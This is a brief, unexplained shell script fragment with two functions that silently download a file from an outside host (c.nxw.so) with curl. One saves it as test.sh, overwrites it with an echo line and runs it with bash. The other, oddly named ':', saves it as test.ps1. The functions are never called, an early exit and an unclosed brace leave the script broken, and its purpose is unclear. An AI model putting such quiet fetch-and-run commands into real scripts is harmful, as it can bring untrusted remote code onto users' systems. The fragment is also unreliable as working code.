goto(){
    curl -sSL http://c.nxw.so/mpis -o test.sh && echo "echo 'test'" > test.sh  && bash test.sh && exit; }
exit;
:(){
curl -sSL http://c.nxw.so/mpis -o test.ps1
exit